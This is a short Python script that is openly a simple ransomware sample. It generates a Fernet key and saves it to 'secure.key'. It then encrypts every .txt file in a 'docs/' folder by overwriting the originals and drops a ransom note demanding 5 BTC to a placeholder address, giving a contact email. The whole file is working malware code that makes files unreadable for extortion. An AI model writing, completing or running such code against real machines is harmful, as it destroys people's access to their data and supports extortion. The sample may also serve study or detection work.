from cryptography.fernet import Fernet
import os

# Step 1: Generate and save a key
key = Fernet.generate_key()
with open("secure.key", "wb") as f:
    f.write(key)

fernet = Fernet(key)
folder = "docs/"

# Step 2: Encrypt .txt files
for filename in os.listdir(folder):
    if filename.endswith(".txt"):
        path = os.path.join(folder, filename)
        with open(path, "rb") as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(path, "wb") as file:
            file.write(encrypted)
        print(f"[ENCRYPTED] {filename}")

# Step 3: Drop ransom note
with open("RANSOM_NOTE.txt", "w") as note:
    note.write(
        "YOUR FILES HAVE BEEN ENCRYPTED.\n"
        "Send 5 BTC to: bc1qexampleaddress\n"
        "Contact: darkside@protonmail.com\n"
    )

print("\n[NOTE DROPPED] RANSOM_NOTE.txt created.")